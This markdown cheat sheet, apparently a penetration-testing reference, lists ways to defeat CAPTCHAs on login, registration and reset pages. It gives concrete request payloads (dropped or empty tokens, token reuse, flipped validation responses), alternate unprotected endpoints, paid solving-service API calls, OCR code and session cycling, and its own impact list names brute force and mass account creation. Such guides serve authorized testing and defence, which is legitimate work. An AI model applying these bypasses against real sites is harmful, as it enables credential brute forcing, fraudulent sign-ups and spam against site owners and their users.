# CAPTCHA Bypass Techniques

## Overview
Techniques to bypass CAPTCHA implementations protecting login, registration, password reset, and other sensitive endpoints.

## Common CAPTCHA Types
- Google reCAPTCHA v2/v3
- hCaptcha
- Image-based CAPTCHA
- Math/text CAPTCHA
- Invisible CAPTCHA

## Parameter-Based Bypass
```
# Simply remove CAPTCHA parameter
Original: username=admin&password=pass&g-recaptcha-response=TOKEN
Bypass: username=admin&password=pass

# Send empty value
g-recaptcha-response=
g-recaptcha-response=null
g-recaptcha-response=undefined
g-recaptcha-response=0
h-captcha-response=

# Send same CAPTCHA token repeatedly (no server-side invalidation)
# Capture valid token, reuse in every request
```

## Response Manipulation
```
# Intercept CAPTCHA validation response
# Change: {"success":false} → {"success":true}
# Change: status 403 → 200
# Remove CAPTCHA validation response check

# If client-side CAPTCHA validation only → bypass entirely
```

## Token Reuse
```
# Complete CAPTCHA once, capture token
# Use same token in all subsequent requests
# Test if server validates token uniqueness/expiry

g-recaptcha-response=03AGdBq... (same token for 100+ requests)
```

## reCAPTCHA v3 Score Bypass
```
# reCAPTCHA v3 returns a score (0.0-1.0)
# Server must check score — if not checked → bypass

# Also: score depends on user behavior
# Simulate legitimate user behavior to get high score
# Use browser automation (Playwright) with normal mouse movements
```

## CAPTCHA Solving Services
```
# Commercial services (for testing with authorization):
# 2captcha, Anti-Captcha, CapMonster, DeathByCaptcha

# API example (2captcha):
POST https://2captcha.com/in.php
key=API_KEY&method=userrecaptcha&googlekey=SITE_KEY&pageurl=TARGET_URL

# Poll for result:
GET https://2captcha.com/res.php?key=API_KEY&action=get&id=REQUEST_ID
```

## Audio CAPTCHA Bypass
```
# reCAPTCHA audio mode is accessible feature
# Can be solved by speech-to-text APIs:
# Google Speech API, AWS Transcribe, Whisper

# Automated: ReBreaker tool for audio CAPTCHA
```

## Logic Flaws
```
# CAPTCHA only checked on first request, not subsequent
# CAPTCHA validation on wrong endpoint
# Different endpoint without CAPTCHA: /api/login vs /login
# Mobile API endpoint skips CAPTCHA
# CAPTCHA validated but result ignored

# Test alternate API paths:
/api/v1/auth/login (no CAPTCHA)
/api/mobile/login (no CAPTCHA)
/api/internal/login (no CAPTCHA)
```

## Math/Text CAPTCHA
```
# Simple automation for text CAPTCHA
# OCR: pytesseract, EasyOCR

import pytesseract
from PIL import Image
captcha_img = Image.open('captcha.png')
text = pytesseract.image_to_string(captcha_img)

# Math CAPTCHA: extract numbers and evaluate
# "What is 5 + 3?" → eval("5 + 3") = 8
```

## Session-Based Bypass
```
# CAPTCHA tied to session
# Create new session (new cookies) to get fresh CAPTCHA slot
# If rate limit is per-session AND CAPTCHA per-session
# → Just keep creating new sessions

# Or: solve CAPTCHA once per session, then brute force within session
```

## Testing Methodology
1. Identify CAPTCHA-protected endpoints
2. Test removing CAPTCHA parameter entirely
3. Test empty/null CAPTCHA values
4. Test reusing a valid CAPTCHA token multiple times
5. Test response manipulation (intercept validation response)
6. Look for alternate endpoints without CAPTCHA
7. Check mobile/API endpoints
8. Test if CAPTCHA is only checked on first step of multi-step flow

## Impact
- Enables brute force attacks on login/OTP/reset endpoints
- Enables automated account creation (spam/fraud)
- Enables automated form submission
